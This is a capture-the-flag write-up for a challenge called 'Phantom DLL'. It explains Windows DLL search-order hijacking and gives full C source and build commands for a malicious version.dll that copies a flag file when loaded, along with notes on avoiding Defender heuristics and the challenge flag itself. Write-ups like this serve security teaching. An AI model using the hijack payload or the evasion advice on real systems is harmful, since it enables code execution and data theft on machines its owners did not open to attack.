---

title: "Phantom DLL"
ctf: "OWASP KL CTF"
date: 2026-07-04
category: "pwn / malware"
difficulty: "hard"
points: "1000 (first come first serve)"
flag_format: "OWASPKL{...}"
author: "s1ght"
---------------

# Phantom DLL

## Challenge Overview

The objective of this challenge was to exploit insecure Windows DLL search path behavior through a classic **Phantom DLL Hijacking / Proxying** attack.

The provided sandbox environment automatically detonated uploaded DLLs inside an isolated Windows VM. By crafting a malicious `version.dll` and abusing the Windows DLL search order, it was possible to force the target application to load attacker-controlled code before resolving the legitimate system library.


Once loaded, the payload copied the secret flag file from:

```text
C:\flag.txt
```


into:

```text
C:\output\stolen.txt
```


The sandbox service subsequently retrieved the contents of `stolen.txt` and returned them through the API response.

---

# Initial Analysis

## Understanding the Challenge Environment

The challenge provided a full Windows 10 VMDK image alongside access to a remote detonation service hosted at:

```text
http://56.68.126.175:8000/
```

At first glance, the image appeared to suggest a traditional post-exploitation or forensic workflow involving:

* password cracking
* registry hive extraction
* SAM dumping
* credential recovery
* privilege escalation

However, after deeper analysis, it became clear that the challenge was actually centered around **Windows DLL search order hijacking** rather than credential compromise.

The VMDK image ultimately served three major purposes:

1. Offline reconnaissance
2. Local exploit development
3. Intentional distraction / CTF noise

---

# Role of the Windows 10 Disk Image

## 1. Offline Reconnaissance & Vulnerability Discovery

The Windows image effectively acted as a clone of the live detonation environment.

Instead of blindly guessing DLL names or vulnerable applications, competitors could boot or mount the image locally to analyze the operating environment directly.

This enabled several important discoveries.

### Filesystem & Environment Enumeration

By inspecting the image locally, it was possible to:

* enumerate installed applications
* inspect startup services
* review custom folders
* analyze the system `PATH`
* identify unusual binaries or helper tools

Directories such as:

```text
C:\Tools
```

provided hints regarding custom sandbox tooling and application behavior.

---

### Discovering DLL Hijack Targets

Using tools such as:

* Process Monitor (`Procmon64.exe`)
* Autoruns
* Registry Explorer

it became possible to observe processes attempting to load DLLs through insecure relative paths.

Inside Procmon, these appeared as repeated:

```text
NAME NOT FOUND
```

events for missing DLLs.

This strongly suggested a DLL search order hijacking vulnerability involving libraries such as:

```text
version.dll
```

or other unresolved dependencies.

---

### Understanding the Actual Objective

One of the most important discoveries was the existence of:

```text
C:\flag.txt
```

containing the message:

```text
FLAG WILL BE PROVIDED IN THE DETONATION ENVIRONMENT
```

This clarified the intended attack path immediately.

The challenge was not about:

* cracking credentials
* gaining persistence
* obtaining interactive shell access

Instead, the goal was simply to exfiltrate the live flag from the sandbox VM through DLL hijacking.

This realization completely changed the solving strategy.

---

# A Major Rabbit Hole

Because the image was a complete, realistic Windows installation, it contained authentic operating system artifacts including:

* SAM / SECURITY registry hives
* NTLM password hashes
* user accounts such as `ctfva`
* event logs
* temporary files
* browser data
* scheduled tasks

Naturally, this encouraged classic forensic and post-exploitation workflows.

In my case, I initially spent a significant amount of time attempting to dump and crack NTLM password hashes using large wordlists before realizing that none of it contributed to the actual objective.

This was clearly intentional challenge design.

The authors created a highly realistic environment specifically to test:

* methodology
* analytical discipline
* prioritization
* ability to distinguish signal from noise

Once I stepped back and focused on DLL loading behavior instead of surrounding Windows artifacts, the intended solution path became much clearer.

---

# Local Exploit Development

The remote detonation portal enforced several operational constraints:

* 60-second submission cooldown
* 30-second execution timeout
* automatic cleanup after execution

As a result, repeatedly testing unstable DLLs against the live portal would have been extremely inefficient.

The provided VM image solved this problem by allowing local exploit development and debugging.

This enabled:

* offline payload testing
* architecture validation (x86 vs x64)
* export debugging
* DLL load monitoring
* Defender heuristic testing
* process crash troubleshooting

Using Process Monitor locally was especially valuable for observing:

* DLL load attempts
* failed library lookups
* search order behavior
* filesystem writes
* execution timing

This dramatically accelerated payload development.

---

# Exploitation Strategy

## DLL Hijacking via `version.dll`

Windows applications frequently load DLLs using insecure search order semantics. If a required DLL is missing from the application directory, Windows searches several locations before eventually resolving the legitimate system DLL.

One of the most common DLL hijacking targets is:

```text
version.dll
```

because many native Windows applications attempt to load it automatically.

By naming the payload:

```text
version.dll
```

the sandboxed process loaded the malicious DLL from the working directory before checking:

```text
C:\Windows\System32\
```

This allowed arbitrary code execution during application startup.

---

# Payload Development

## Reliability Considerations

Initial payload attempts failed for several reasons:

* asynchronous execution terminated too quickly
* spawned threads sometimes never executed
* `WinExec()` and `cmd.exe` invocations triggered Defender heuristics
* unnecessary stealth logic increased instability
* some payloads crashed under loader lock conditions

To maximize reliability, the final payload:

* used only native Win32 APIs
* executed synchronously inside `DLL_PROCESS_ATTACH`
* avoided PowerShell and shell execution
* avoided creating worker threads
* performed a direct file copy using `CopyFileA()`

This dramatically improved stability inside the constrained detonation sandbox.

---

# Final Payload

```c
#include <windows.h>

#define EXPORT __declspec(dllexport)

void RunPayload() {

    // Ensure output directory exists
    CreateDirectoryA("C:\\output", NULL);

    // Copy the secret flag into the exfiltration path
    CopyFileA(
        "C:\\flag.txt",
        "C:\\output\\stolen.txt",
        FALSE
    );
}

// Common exports potentially expected by target applications
EXPORT void Initialize() {
    RunPayload();
}

EXPORT void SomeExportedFunc() {
    RunPayload();
}

EXPORT int Add(int a, int b) {
    RunPayload();
    return a + b;
}

// DLL Entry Point
BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD reason,
    LPVOID reserved
) {

    if (reason == DLL_PROCESS_ATTACH) {

        DisableThreadLibraryCalls(hModule);

        // Execute synchronously during DLL load
        RunPayload();
    }

    return TRUE;
}
```

---

# Compilation

The payload was compiled as a 64-bit DLL using `mingw-w64`:

```bash
x86_64-w64-mingw32-gcc \
    -shared \
    -o version.dll \
    payload.c \
    -m64 \
    -O2 \
    -s \
    -lkernel32 \
    -luser32
```

Verification confirmed the DLL was a valid 64-bit PE file.

---

# Detonation & Exfiltration

After uploading `version.dll` to the detonation portal, the sandbox process loaded the malicious DLL during application startup.

During `DLL_PROCESS_ATTACH`, the payload copied:

```text
C:\flag.txt
```

into:

```text
C:\output\stolen.txt
```

The challenge infrastructure subsequently opened `stolen.txt` and returned its contents through:

```text
/status/<job_id>
```

revealing the real challenge flag.

---

# Flag

```text
OWASPKL{2c5f5b16dd2adfa60215ecc072881b66}
```

---

# Key Takeaways

This challenge showcased several important offensive security concepts:

* Windows DLL search order hijacking
* Phantom DLL proxying
* Safe DLL initialization practices
* Sandbox detonation workflows
* Defender heuristic avoidance
* Reliable payload execution in constrained environments
* Importance of prioritization during investigations

Most importantly, the challenge reinforced a valuable lesson common in realistic CTFs and red-team engagements:

> Not every artifact is relevant.

The Windows image intentionally contained enough realistic forensic noise to lure competitors into unnecessary rabbit holes such as password cracking and credential hunting.

The real breakthrough came only after stepping back, reassessing the objective, and focusing specifically on DLL loading behavior rather than the surrounding operating system artifacts.

This made the challenge significantly more rewarding than a straightforward DLL hijacking exercise and served as an excellent example of balancing technical exploitation with disciplined analysis.
